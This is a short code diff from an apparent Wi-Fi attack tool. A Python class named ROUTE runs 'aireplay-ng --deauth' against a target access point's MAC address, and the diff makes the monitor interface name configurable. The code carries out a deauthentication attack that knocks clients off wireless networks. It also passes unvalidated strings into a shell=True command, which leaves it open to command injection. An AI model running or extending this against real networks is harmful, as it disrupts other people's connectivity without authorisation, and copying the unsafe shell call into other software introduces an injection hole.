@@ -11,15 +11,16 @@ filedir = os.path.dirname(os.path.realpath(__file__))
 
 class ROUTE:
 
-    def __init__(self, mac):
+    def __init__(self, mac, wlanname):
         # self.routeattack = os.path.join(filedir, 'routrattack', 'routeattack.log')
         self.logpath = "/home/execute.log"
         self.mac = mac
         self.limit = 5
+        self.wlanname = wlanname
 
     # 保存shell的所有输出
     def writeinfotolog(self):
-        cmd = 'aireplay-ng --deauth 10 -a {} wlan0mon'.format(self.mac)
+        cmd = 'aireplay-ng --deauth 10 -a {} {}mon'.format(self.mac, self.wlanname)
         p = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
         output, err = p.communicate()
         return output
